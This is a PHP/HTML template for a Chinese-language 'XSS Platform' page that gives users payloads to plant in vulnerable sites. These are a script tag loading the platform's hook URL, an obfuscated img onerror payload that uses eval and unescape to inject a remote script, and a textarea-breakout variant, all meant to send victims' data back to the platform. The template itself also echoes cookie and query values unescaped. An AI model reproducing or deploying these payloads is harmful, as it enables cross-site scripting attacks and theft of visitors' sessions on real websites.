<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>XSS Platform</title>
<link rel="stylesheet" href="<?php echo  STATIC_STYLE_URL?>screen.css" type="text/css" media="screen, projection"> 
<link rel="stylesheet" href="<?php echo  STATIC_STYLE_URL?>print.css" type="text/css" media="print"> 
<!--[if lt IE 8]><link rel="stylesheet" href="<?php echo  STATIC_STYLE_URL?>ie.css" type="text/css" media="screen, projection"><![endif]-->
<link rel="stylesheet" href="<?php echo  STATIC_STYLE_URL?>style.css" type="text/css" media="screen, projection">
<script type="text/javascript" src="<?php echo STATIC_JS_URL ?>jquery.js"></script>

<style>
ul { margin:0}
</style>
<body>
<div id="xoxo">
<h1>XSS Platform</h1>
<div class="left menus">
	<div class="menutitle">

<?php  echo  $_COOKIE['xing_name'].";"  ?> <a href="?m=user&a=logout">退出</a><br />

		<a class="left" href="<?php echo SITE_ROOT ?>?m=xing">我的项目</a>
		<a class="right" href="?m=project&a=add">创建</a>
	</div>
	<style>
ul { margin:0; width:140px; overflow:scroll-x; word-break:break-all}
.ohidden ul { height:18px; overflow:hidden }
a.oall,a.un { text-decoration:none }
td { vertical-align:top }
</style>

<table height="200">
	<ul>	
				 			</ul>
			<div class="menutitle">
			<a class="left" href="?m=project&a=edit">密码修改</a>
			</div>
			
			<div class="menutitle">
			<a class="left" href="">特别感谢</a>
			</div>
			<ul>
			
			<li><a href="#">感谢<b>Yaseng@Wooyun</b>的开源框架！</a></li>
			</ul>
			<div class="menutitle">
			<a class="left" href="">本项目源码</a>
			</div>
			<ul>
			<li><a href="#">整理中，敬请期待。。</a></li>
			</ul>
			</table>
	</div>


<div class="span-19 left">
<p>当前位置： <a href="<?php echo SITE_ROOT ?>?m=project&a=show&pid=<?php  echo $_GET[pid];?>">返回项目</a> > 辅助代码</p>
<caption><h3>项目名称: <?php  echo  $pro['name']?></h3></caption>

<label>如何使用：</label>
<p>
短域名：<a href="http://126.am/" target="_blank">申请</a>
</p>
<p>将如下代码植入怀疑出现xss的地方（注意'的转义），即可在 <a href="<?php echo SITE_ROOT ?>?m=project&a=show&pid=<?php  echo $_GET[pid];?>">项目内容</a> 观看XSS效果。</p>
<code>
<?php  
			            $url=SITE_ROOT."?u=".$pro['url'];
			            echo   htmlentities("<script  src=\"{$url}\"></script>");  ?>
</code>
</p>
<p>
或者
</p>
<p>
<code>
&lt;/textarea&gt;&#039;&quot;&gt;&lt;img src=# id=xssyou style=display:none onerror=eval(unescape(/var%20b%3Ddocument.createElement%28%22script%22%29%3Bb.src%3D%22<?php   echo   htmlentities(SITE_ROOT."?u=".$pro['url']);?>%22%3B%28document.getElementsByTagName%28%22HEAD%22%29%5B0%5D%7C%7Cdocument.body%29.appendChild%28b%29%3B/.source));//&gt;
</code>
</p>

<p>

再或者以你任何想要的方式插入

</p>

<p>
<code>
&lt;/textarea&gt;&#039;&quot;&gt;<?php  
			            $url=SITE_ROOT."?u=".$pro['url'];
			            echo   htmlentities("<script  src=\"{$url}\"></script>");  ?>
</code>
</code>
</p>
<p>
<input type="button" value="返回" onclick="location.href='<?php echo SITE_ROOT ?>?m=project&a=show&pid=<?php  echo $_GET[pid];?>'" />
</p>
</div>
</div>
</div>
</body>
</html>